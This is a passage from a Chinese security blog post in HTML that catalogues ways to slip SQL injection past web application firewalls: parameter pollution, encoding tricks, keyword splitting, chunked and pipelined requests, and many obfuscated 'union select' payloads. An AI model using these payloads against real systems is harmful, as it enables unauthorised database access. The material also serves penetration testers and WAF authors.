+<h3 id="2-9-语言特性绕过"><a href="#2-9-语言特性绕过" class="headerlink" title="2.9 语言特性绕过"></a>2.9 语言特性绕过</h3><p>在 php 语言中 id=1&amp;id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。</p>
+<table>
+<thead>
+<tr>
+<th align="center">服务器中间件</th>
+<th align="center">解析结果</th>
+<th align="center">举例说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">ASP.NET/IIS</td>
+<td align="center">所有出现的参数值用逗号连接</td>
+<td align="center">color=red,blue</td>
+</tr>
+<tr>
+<td align="center">ASP/IIS</td>
+<td align="center">所有出现的参数用逗号连接</td>
+<td align="center">color=red,blue</td>
+</tr>
+<tr>
+<td align="center">PHP/Apache</td>
+<td align="center">仅最后一次出现参数值</td>
+<td align="center">color=blue</td>
+</tr>
+<tr>
+<td align="center">PHP/Zeus</td>
+<td align="center">仅最后一次出现参数值</td>
+<td align="center">color=blue</td>
+</tr>
+<tr>
+<td align="center">JSP,Servlet/Apache Tomcat</td>
+<td align="center">仅第一次出现参数值</td>
+<td align="center">color=red</td>
+</tr>
+<tr>
+<td align="center">JSP,Servlet/Oracle Application Server 10g</td>
+<td align="center">仅第一次出现参数值</td>
+<td align="center">color=red</td>
+</tr>
+<tr>
+<td align="center">JSP,Servlet/Jetty</td>
+<td align="center">仅第一次出现参数值</td>
+<td align="center">color=red</td>
+</tr>
+<tr>
+<td align="center">IBM Lotus Domino</td>
+<td align="center">仅最后一次出现参数值</td>
+<td align="center">color=blue</td>
+</tr>
+<tr>
+<td align="center">IBM HTTP Server</td>
+<td align="center">仅第一次出现参数值</td>
+<td align="center">color=red</td>
+</tr>
+<tr>
+<td align="center">mod_perl,libapreq2/Apache</td>
+<td align="center">仅第一次出现参数值</td>
+<td align="center">color=red</td>
+</tr>
+<tr>
+<td align="center">Perl CGI/Apache</td>
+<td align="center">仅第一次出现参数值</td>
+<td align="center">color=red</td>
+</tr>
+<tr>
+<td align="center">mod_wsgi(Python)/Apache</td>
+<td align="center">仅第一次出现参数值</td>
+<td align="center">color=red</td>
+</tr>
+<tr>
+<td align="center">Python/Zope</td>
+<td align="center">转化为List</td>
+<td align="center">color=[‘red’,’blue’]</td>
+</tr>
+</tbody></table>
+<h3 id="2-10-逗号绕过"><a href="#2-10-逗号绕过" class="headerlink" title="2.10 逗号绕过"></a>2.10 逗号绕过</h3><p><code>substr</code></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>mid</code></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>join</code></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>like</code></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'%r%'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>offset</code></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-11-or-and-xor-not绕过"><a href="#2-11-or-and-xor-not绕过" class="headerlink" title="2.11 or and xor not绕过"></a>2.11 or and xor not绕过</h3><p><code>&amp;&amp;</code>等价于and</p>
+<p><code>||</code>等价于or</p>
+<p><code>!</code>等价于not</p>
+<p><code>|</code>等价于xor</p>
+<h3 id="2-12-ASCII字符对比绕过"><a href="#2-12-ASCII字符对比绕过" class="headerlink" title="2.12 ASCII字符对比绕过"></a>2.12 ASCII字符对比绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>; # <span class="type">char</span>(<span class="number">114</span>)<span class="operator">=</span><span class="string">'r'</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-13-等号绕过"><a href="#2-13-等号绕过" class="headerlink" title="2.13 等号绕过"></a>2.13 等号绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ascii(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">115</span>; # <span class="operator">&gt;</span> <span class="operator">&lt;</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="keyword">like</span> <span class="string">'r%'</span>; #<span class="keyword">like</span> rlike</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() regexp <span class="string">'^r'</span>; # regexp</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-14-双写绕过"><a href="#2-14-双写绕过" class="headerlink" title="2.14 双写绕过"></a>2.14 双写绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uniunionon seleselectct</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-15-二次编码绕过"><a href="#2-15-二次编码绕过" class="headerlink" title="2.15 二次编码绕过"></a>2.15 二次编码绕过</h3><p><code>-1 union select 1,2,3,4# </code></p>
+<p>第一次编码：</p>
+<p><code>%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 </code></p>
+<p>第二次编码：</p>
+<p><code>%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33</code></p>
+<h3 id="2-16-参数拆分绕过"><a href="#2-16-参数拆分绕过" class="headerlink" title="2.16 参数拆分绕过"></a>2.16 参数拆分绕过</h3><p>对于a=[input1]&amp;b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了<code>union select</code>，可以使用参数拆分</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">'union/*&amp;username=*/select 1,user(),3,4--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-17-生僻函数绕过"><a href="#2-17-生僻函数绕过" class="headerlink" title="2.17 生僻函数绕过"></a>2.17 生僻函数绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> @<span class="variable">@version</span>) f) x)); # polygon()替换updatexml()</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-18-分块传输绕过"><a href="#2-18-分块传输绕过" class="headerlink" title="2.18 分块传输绕过"></a>2.18 分块传输绕过</h3><p>​	如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。</p>
+<p>​	接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(“\r\n”)。然后是数据本身，数据结束后，还会有CRLF(“\r\n”)两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。</p>
+<h3 id="2-19-信任白名单绕过"><a href="#2-19-信任白名单绕过" class="headerlink" title="2.19 信任白名单绕过"></a>2.19 信任白名单绕过</h3><p>WAF会自带一些文件白名单，可以利用白名单绕过</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>phpmyadmin?name<span class="operator">=</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="keyword">user</span>()<span class="comment">--+&amp;submit=1</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-20-pipline绕过"><a href="#2-20-pipline绕过" class="headerlink" title="2.20 pipline绕过"></a>2.20 pipline绕过</h3><p>​	http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，Apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。</p>
+<p>​	用 burpsuite 抓包提交，复制整个包信息放在第一个包最后，把第一个包close 改成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉，有些WAF不会对第一个包的参数进行检测。</p>
+<h3 id="2-21-利用multipart-form-data绕过"><a href="#2-21-利用multipart-form-data绕过" class="headerlink" title="2.21 利用multipart/form-data绕过"></a>2.21 利用multipart/form-data绕过</h3><p>​	multipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>
+<h3 id="2-22-order-by-绕过"><a href="#2-22-order-by-绕过" class="headerlink" title="2.22 order by 绕过"></a>2.22 order by 绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> <span class="variable">@a</span>,<span class="variable">@b</span>,<span class="variable">@c</span>,<span class="variable">@d</span>; # 替代<span class="keyword">order</span> <span class="keyword">by</span>猜解字段数</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-23-修改请求方式绕过"><a href="#2-23-修改请求方式绕过" class="headerlink" title="2.23 修改请求方式绕过"></a>2.23 修改请求方式绕过</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以更改请求方式尝试绕过。</p>
+<h3 id="2-24-大量字符绕过"><a href="#2-24-大量字符绕过" class="headerlink" title="2.24 大量字符绕过"></a>2.24 大量字符绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">select</span> <span class="number">0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>)<span class="comment">/*!union*/</span><span class="comment">/*!select*/</span><span class="number">1</span>,<span class="keyword">user</span>()</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-25-花括号绕过"><a href="#2-25-花括号绕过" class="headerlink" title="2.25 花括号绕过"></a>2.25 花括号绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span>{x <span class="number">1</span>},<span class="keyword">user</span>(); # 花括号左边是注释的内容</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-26-union-select绕过"><a href="#2-26-union-select绕过" class="headerlink" title="2.26 union select绕过"></a>2.26 union select绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sel<span class="operator">&lt;&gt;</span>ect # 程序过滤<span class="operator">&lt;&gt;</span>为空 脚本处理</span><br><span class="line">sele<span class="comment">/**/</span>ct # 程序过滤<span class="comment">/**/</span>为空</span><br><span class="line"><span class="comment">/*!%53eLEct*/</span> # url 编码与内联注释</span><br><span class="line">se<span class="operator">%</span><span class="number">0</span>blect # 使用空格绕过</span><br><span class="line">sele<span class="operator">%</span>ct # 使用百分号绕过</span><br><span class="line"><span class="operator">%</span><span class="number">53</span>eLEct # 编码绕过</span><br><span class="line"><span class="keyword">uNIoN</span> <span class="keyword">sELecT</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">DISTINCT</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">null</span><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">/*!union*/</span><span class="comment">/*!select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">Select</span> <span class="number">0xA</span><span class="operator">*</span><span class="number">1000</span>)<span class="comment">/*!uNIOn*/</span><span class="comment">/*!SeLECt*/</span> <span class="number">1</span>,<span class="keyword">user</span>()</span><br><span class="line"><span class="comment">/*!50000union*/</span><span class="comment">/*!50000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">/*!40000union*/</span><span class="comment">/*!40000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>aunion<span class="operator">%</span><span class="number">0</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">250</span>aunion<span class="operator">%</span><span class="number">250</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">09</span><span class="keyword">union</span><span class="operator">%</span><span class="number">09</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>caunion<span class="operator">%</span><span class="number">0</span>cselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>daunion<span class="operator">%</span><span class="number">0</span>dselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>baunion<span class="operator">%</span><span class="number">0</span>bselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>d<span class="operator">%</span><span class="number">0</span>aunion<span class="operator">%</span><span class="number">0</span>d<span class="operator">%</span><span class="number">0</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2</span></span><br><span class="line"><span class="comment">/*!12345union*/</span><span class="comment">/*!12345select*/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/*中文*/</span><span class="keyword">union</span><span class="comment">/*中文*/</span><span class="keyword">select</span><span class="comment">/*中文*/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/* */</span><span class="keyword">union</span><span class="comment">/* */</span><span class="keyword">select</span><span class="operator">/</span> <span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/*!union*/</span><span class="comment">/*!00000all*/</span><span class="comment">/*!00000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+          </div>
+
+        
+
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">squar3c</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">22k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">41 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">
+    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
+  </div>
+
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/03/2025 10:00:00"); //此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒.";
+    }
+setInterval("createtime()",250);
+</script>
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.1/dist/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: '32px',
+  left: '',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: false,
+  label: ' ',
+  autoMatchOsTheme: false
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+if (window.darkmode && !window.darkmode.isActivated()) {
+  window.darkmode.toggle();
+  var toggleButtons = document.getElementsByClassName("darkmode-toggle");
+  if (toggleButtons && toggleButtons.length > 0) {
+    for (i = 0; i < toggleButtons.length; i++) {
+      toggleButtons[i].classList.add("darkmode-toggle--white");
+    }
+  }
+}
+</script>
+
+</body>
+</html>
